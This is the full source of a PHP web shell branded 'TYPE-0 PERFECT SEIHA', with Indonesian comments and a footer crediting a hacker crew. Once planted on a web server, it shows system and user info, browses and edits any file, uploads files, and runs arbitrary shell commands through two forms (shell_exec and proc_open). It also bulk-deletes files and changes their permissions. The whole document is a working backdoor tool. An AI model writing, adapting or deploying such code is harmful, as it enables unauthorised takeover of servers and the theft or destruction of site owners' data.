
<!DOCTYPE html>
<html>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta charset="UTF-8">
<link rel="icon" href="https://i.imgur.com/STpfZR9.png" type="image/png">
<link rel="stylesheet" href="https://titan.mythicmc.org/styles.css"> 
<script src="https://titan.mythicmc.org/movingblob.js" type="4373df8595d037690e63774b-text/javascript"></script>
<head>
<title>TYPE-0 PERFECT SEIHA</title>
<style>
    <style>
        @import url('https://fonts.googleapis.com/css?family=Dosis');
        @import url('https://fonts.googleapis.com/css?family=Bungee');
        @import url('https://fonts.googleapis.com/css?family=Russo+One');
        body, h1, h2, h3, p, th, td, a, pre {
			color: #fff;
            font-family: "Russo One", cursive;
            text-shadow: 0px 0px 1px #434170;
            margin: 20px;
        }
        .container { max-width: 800px; margin: 20px auto; padding: 20px; border: 1px solid #ccc; }
        table { width: 100%; border-collapse: collapse; }
        td { border: 1px solid #ddd; padding: 8px; text-align: left; color: #fff; }
        th { background-color: #292929; }
        .breadcrumb { list-style-type: none; padding: 0; display: flex; flex-wrap: wrap; justify-content: center; color: #fff; }
        .breadcrumb li { margin-right: 5px; color: #fff; }
        .breadcrumb a { text-decoration: none; color: #fff; }
        .permission-green { color: green; }
        .permission-red { color: red; }
        .current-directory h3 {
            text-align: center;
        }
        .home-link { font-size: 18px; margin-bottom: 10px; }
        h1 {
            color: #fff;
        }
		h2 {
            color: #fff;
        }
		h3 {
            color: #fff;
        }
		pre {
            color: #fff;
        }
		li {
            color: #fff;
        }
		.lime-text {
            color: #3df2ff;
        }
        form {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
        }
        input[type="text"], input[type="checkbox"] {
            margin-right: 5px;
        }
        button {
            padding: 5px 10px;
            background-color: #007bff;
            color: #fff;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            padding: 10px;
            border: 1px solid #ddd;
            text-align: left;
        }
        th {
            background-color: #f4f4f4;
        }
        .select-all {
            margin-bottom: 10px;
        }
		table td a {
        color: white; /* Warna untuk tautan folder/file */
		}
		table td a:hover {
        color: green; /* Warna saat tautan di-hover */
		}
    </style>
</style>
</head>
<header>
<img src="https://i.imgur.com/STpfZR9.png" style="height: 100px;">
<span class="full-text">TYPE-0 PERFECT SEIHA</span>
<span class="short-text">Type-0</span>
</header>
<div id="bgtiles"></div>
<img class="bgsprite" id="sprite1" src="https://titan.mythicmc.org/blob1.png" width="501" height="471" style="display: block; left: -269.237px; top: 484.032px;">
<img class="bgsprite" id="sprite2" src="https://titan.mythicmc.org/blob2.png" width="501" height="471" style="display: block; left: -269.237px; top: 484.032px;">
<img class="bgsprite" id="sprite3" src="https://titan.mythicmc.org/blob3.png" width="501" height="471" style="display: block; left: -269.237px; top: 484.032px;">
<img class="bgsprite" id="sprite4" src="https://titan.mythicmc.org/blob4.png" width="501" height="471" style="display: block; left: -269.237px; top: 484.032px;">
<img class="bgsprite" id="sprite5" src="https://titan.mythicmc.org/blob.png" width="501" height="471" style="display: block; left: -269.237px; top: 484.032px;">
<body>
    <div class="container">
        <h2>TYPE-0 PERFECT SEIHA</h2>
        <?php
        echo '<h3>Server Info:</h3>';
        echo '<pre>' . shell_exec('uname -a') . '</pre>';
        echo '<h3>User Info:</h3>';
        echo '<pre>' . shell_exec('id') . '</pre>';
        echo '<h3>Server Software:</h3>';
        if (strpos($_SERVER['SERVER_SOFTWARE'], 'LiteSpeed') !== false) {
            echo '<pre>LiteSpeed</pre>';
        } elseif (strpos($_SERVER['SERVER_SOFTWARE'], 'Apache') !== false) {
            echo '<pre>Apache</pre>';
        } else {
            echo '<pre>' . $_SERVER['SERVER_SOFTWARE'] . '</pre>';
        }
        function listFiles($dir) {
    $folders = array();
    $files = array();
    if (is_dir($dir)) {
        if ($dh = opendir($dir)) {
            while (($file = readdir($dh)) !== false) {
                if ($file != '.' && $file != '..') {
                    $filePath = $dir . '/' . $file;
                    $fileInfo = stat($filePath);
                    $permissions = substr(sprintf('%o', fileperms($filePath)), -4);
                    $lastModified = date('Y-m-d H:i:s', $fileInfo['mtime']);
                    
                    // Cek apakah posix tersedia
                    if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
					$pwuid = @posix_getpwuid($fileInfo['uid']);
					$grgid = @posix_getgrgid($fileInfo['gid']);
					$userGroup = $pwuid['name'] . '/' . $grgid['name'];
					} else {
					$userGroup = 'Unknown/Unknown'; // Fallback untuk Windows
					}

                    $size = is_dir($filePath) ? '-' : filesize($filePath);
                    $permissionClass = is_writable($filePath) ? 'permission-green' : 'permission-red';

                    $fileData = array(
                        'name' => $file,
                        'size' => $size,
                        'permissions' => $permissions,
                        'lastModified' => $lastModified,
                        'userGroup' => $userGroup,
                        'path' => $filePath,
                        'isDir' => is_dir($filePath),
                        'permissionClass' => $permissionClass
                    );
                    if ($fileData['isDir']) {
                        $folders[] = $fileData;
                    } else {
                        $files[] = $fileData;
                    }
                }
            }
            closedir($dh);
        }
    } else {
        echo '<p>Not a valid directory.</p>';
    }
    echo '<h3>Folders:</h3>';
    echo '<table>';
    echo '<tr><th>Name</th><th>Size</th><th>Permissions</th><th>Last Modified</th><th>User/Group</th></tr>';
    foreach ($folders as $folder) {
        echo '<tr>';
        echo '<td><a href="?dir='.urlencode($folder['path']).'"> '.$folder['name'].'</a></td>';
        echo '<td>'.$folder['size'].'</td>';
        echo '<td class="'.$folder['permissionClass'].'">'.$folder['permissions'].'</td>';
        echo '<td>'.$folder['lastModified'].'</td>';
        echo '<td>'.$folder['userGroup'].'</td>';
        echo '</tr>';
    }
    echo '</table>';
    echo '<h3>Files:</h3>';
    echo '<table>';
    echo '<tr><th>Name</th><th>Size</th><th>Permissions</th><th>Last Modified</th><th>User/Group</th></tr>';
    foreach ($files as $file) {
        echo '<tr>';
        echo '<td><a href="?dir='.urlencode($dir).'&edit='.urlencode($file['path']).'"> '.$file['name'].'</a></td>';
        echo '<td>'.$file['size'].'</td>';
        echo '<td class="'.$file['permissionClass'].'">'.$file['permissions'].'</td>';
        echo '<td>'.$file['lastModified'].'</td>';
        echo '<td>'.$file['userGroup'].'</td>';
        echo '</tr>';
    }
    echo '</table>';
}

        $currentDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
        if (isset($_GET['dir']) && is_dir($_GET['dir'])) {
            $currentDir = realpath($_GET['dir']);
        }
        chdir($currentDir);
        // Aploder
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['files'])) {
            $uploadDir = $currentDir . '/';
            // Loop untuk menangani beberapa file
            foreach ($_FILES['files']['name'] as $key => $name) {
                $uploadFile = $uploadDir . basename($name);
                if (move_uploaded_file($_FILES['files']['tmp_name'][$key], $uploadFile)) {
                    echo '<p>File ' . htmlspecialchars($name) . ' uploaded successfully.</p>';
                } else {
                    echo '<p>Failed to upload file ' . htmlspecialchars($name) . '.</p>';
                }
            }
        }
        // Komeng
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['komeng'])) {
            $komeng = $_POST['komeng'];
            if ($komeng) {
                echo '<h3>Komeng Output:</h3>';
                echo '<pre>';
                echo shell_exec(escapeshellcmd($komeng));
                echo '</pre>';
            }
        }
        // Edit
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save'])) {
            $fileToSave = $_POST['filename'];
            $content = $_POST['content'];
            file_put_contents($fileToSave, $content);
            // Tetap berada di halaman edit setelah menyimpan
            $dir = dirname($fileToSave);
            header("Location: ?dir=" . urlencode($dir) . "&edit=" . urlencode($fileToSave));
            
        }
        // Krit dir
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_dir'])) {
            $newDir = $_POST['new_dir'];
            if ($newDir) {
                $newDirPath = $currentDir . '/' . $newDir;
                if (!is_dir($newDirPath)) {
                    mkdir($newDirPath);
                    echo '<p>Directory created successfully.</p>';
                } else {
                    echo '<p>Directory already exists.</p>';
                }
            }
        }
        // Krit file
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_file'])) {
            $newFile = $_POST['new_file'];
            if ($newFile) {
                $newFilePath = $currentDir . '/' . $newFile;
                if (!file_exists($newFilePath)) {
                    file_put_contents($newFilePath, '');
                    echo '<p>File created successfully.</p>';
                } else {
                    echo '<p>File already exists.</p>';
                }
            }
        }
		// Current Direktori
        function renderBreadcrumb($currentDir) {
            $pathArray = explode(DIRECTORY_SEPARATOR, $currentDir);
            echo '<ul class="breadcrumb" style="justify-content:center;">';
            echo '<li><a href="?">[HOME]</a></li>';
            foreach ($pathArray as $index => $dir) {
                if ($dir === '') continue;  
                $path = implode(DIRECTORY_SEPARATOR, array_slice($pathArray, 0, $index + 1));
                echo '<li><a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($dir) . '</a></li>';
                if ($index < count($pathArray) - 1) {
                    echo '<li>/</li>';
                }
            }
            echo '</ul>';
        }
        ?>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="files[]" multiple>
            <button type="submit">Upload Files</button>
        </form>

        <form method="POST">
		<label for="komeng"><font color="white">Komeng:</font></label>
            <input type="text" name="komeng" placeholder="Enter Komeng">
            <button type="submit">Execute Komeng</button>
        </form>
		
		<?php //  PROC OPEN :V
		if ($_SERVER["REQUEST_METHOD"] === "POST") {
			$cmd = escapeshellcmd($_POST['cmd']);
			$descriptorspec = array(
				0 => array("pipe", "r"),  // stdin
				1 => array("pipe", "w"),  // stdout
				2 => array("pipe", "w")   // stderr
			);
			$process = proc_open($cmd, $descriptorspec, $pipes);
			if (is_resource($process)) {
			$output = stream_get_contents($pipes[1]);
			fclose($pipes[1]);
			proc_close($process);
			}
			}
		?>
		<form method="post">
			<label for="cmd" class="lime-text">PROC:</label>
			<input type="text" name="cmd" id="cmd" required>
			<button type="submit">Run PROC</button>
		</form>
		<pre class="lime-text"><?php if (isset($output)) { echo htmlspecialchars($output); } ?></pre>
		
        <form method="POST">
            <input type="text" name="new_file" placeholder="New file name">
            <button type="submit">Create File</button>
        </form>

        <form method="POST">
            <input type="text" name="new_dir" placeholder="New directory name">
            <button type="submit">Create Directory</button>
        </form>
        <?php
        renderBreadcrumb($currentDir);
        if (isset($_GET['edit'])) {
            $fileToEdit = $_GET['edit'];
            if (is_file($fileToEdit)) {
                $content = file_get_contents($fileToEdit);
                echo '<h3>Edit File: ' . htmlspecialchars($fileToEdit) . '</h3>';
                echo '<form method="POST">';
                echo '<textarea name="content" rows="20" cols="100">' . htmlspecialchars($content) . '</textarea><br>';
                echo '<input type="hidden" name="filename" value="' . htmlspecialchars($fileToEdit) . '">';
                echo '<button type="submit" name="save">Save</button>';
                echo '</form>';
            }
        }
		listFiles($currentDir);
        ?>
        
    </div>
</body>
<?php
$directory = '.'; // Direktori saat ini
$message = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['action']) && isset($_POST['items'])) {
        $action = $_POST['action'];
        $items = $_POST['items'];

        if ($action === 'delete') {
            foreach ($items as $item) {
                if (is_file($item)) {
                    unlink($item);
                } elseif (is_dir($item)) {
                    rmdir($item);
                }
            }
            $message = 'File/folder berhasil dihapus.';
        } elseif ($action === 'chmod' && isset($_POST['permissions'])) {
            $permissions = $_POST['permissions'];
            if (preg_match('/^[0-7]{3,4}$/', $permissions)) {
                foreach ($items as $item) {
                    if (file_exists($item)) {
                        chmod($item, octdec($permissions));
                    }
                }
                $message = "Permission menjadi $permissions untuk file/folder yang dipilih.";
            } else {
                $message = 'Permission salah.';
            }
        } else {
            $message = 'Gagal cok wkwk.';
        }
    }
}

// Ambil daftar file/folder dan izin mereka
$files = [];
foreach (glob('*') as $file) {
    $files[$file] = substr(decoct(fileperms($file) & 0777), -3);
}

?>
<h1>Genjoet File/Folder</h1>
    <form method="post">
        <fieldset>
            <legend><font color="white">File/Folder List</font></legend>
            <?php if (isset($message)): ?>
                <p><strong><?php echo htmlspecialchars($message); ?></strong></p>
            <?php endif; ?>
            <div class="select-all">
                <input type="checkbox" id="select-all">
                <label for="select-all"><font color="white">Pilih Semua</font></label>
            </div>
            <table>
                <thead>
                    <tr>
                        <th width="200">Pilih bang</th>
                        <th>Filelist</th>
                        <th width="200">Permission</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($files as $file => $perm): ?>
                        <tr>
                            <td><input type="checkbox" name="items[]" value="<?php echo htmlspecialchars($file); ?>"></td>
                            <td><?php echo htmlspecialchars($file); ?></td>
                            <td><?php echo htmlspecialchars($perm); ?></td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
            <br>
            <label for="permissions"><font color="white">Cemot (755. dll):</font></label>
            <input type="text" id="permissions" name="permissions">
            <br><br>
            <label for="action"><font color="white">Diapain?:</font></label>
            <select id="action" name="action" required>
                <option value="" disabled selected>Diapain?</option>
                <option value="delete">Apus</option>
                <option value="chmod">Cemot</option>
            </select>
            <br><br>
            <button type="submit">Gaskeuun!</button>
        </fieldset>
    </form>

    <script>
        // Script untuk "Pilih Semua"
        document.getElementById('select-all').addEventListener('change', function() {
            var isChecked = this.checked;
            var checkboxes = document.querySelectorAll('input[name="items[]"]');
            checkboxes.forEach(function(checkbox) {
                checkbox.checked = isChecked;
            });
        });
    </script>
</div>
<div class="footer">
<marquee><a href="https://type0.my.id">Anon7 | <font color ="red">Type-0</font> | ./meicookies | MR.HAGAN_404CR4ZY | He4l3rz | Mr.Grim | VenoRyan | Rian Haxor | ChokkaXploiter | MungielL | Nzxsx7 | ./G1L4N6_ST86 | kuroaMEpiKAcyu | UnknownSec | Temp3 | xRyukz  | RavaFake | Cubjrnet7 | Calutax07 | ./Mr.Spongebob | ./BE64L | Localheadz</a></marquee>
</div>
<script src="https://titan.mythicmc.org/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="4373df8595d037690e63774b-|49" defer></script></body>
</html>
